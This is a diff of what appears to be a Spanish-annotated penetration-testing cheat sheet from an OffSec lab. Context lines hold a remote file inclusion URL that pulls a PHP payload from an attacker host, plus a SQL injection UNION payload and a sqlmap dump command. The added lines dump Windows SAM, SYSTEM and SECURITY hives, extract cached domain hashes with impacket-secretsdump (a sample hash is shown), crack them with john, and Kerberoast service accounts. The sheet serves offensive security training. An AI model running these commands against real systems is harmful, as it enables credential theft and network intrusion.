@@ -42,5 +42,18 @@ http://192.168.239.10/menu.php?file=http://192.168.119.239/evil.txt.php&cmd=ipco
 UNION select 1,2,group_concat(password),4,5 FROM users
 --automatizado 
 sqlmap -u "http://192.168.239.52/debug.php?id=1" -p"id" --dbms=sqlite --dump
-###
-
+###Dump password windows Cache - NOTA: Estos archivos se deben generar con usuario System
+reg save HKLM\sam sam
+reg save HKLM\system system
+reg save HKLM\security security
+- pasar a impacket los archivos generados
+impacket-secretsdump -sam sam -security security -system system LOCAL
+[*] Dumping cached domain logon information (domain/username:hash)
+Domain/Nathan:$DCC2$10240#Nathan#298e6604af6e3f8a9fac422ab8feaf26
+-guardar lo anterior en archivo key y crackear password
+john --wordlist=rockyou.txt key
+###extraer informacion de usuarios principales SPNs
+impacket-GetUserSPNs -dc-ip 192.168.183.57 'OFFSEC.LOCAL/usuario:password' -outputfile UserSPNs
+john --format=krb5tgs --wordlist=rockyou.txt UserSPNs 
+john --format=krb5tgs --show UserSPNs
+####
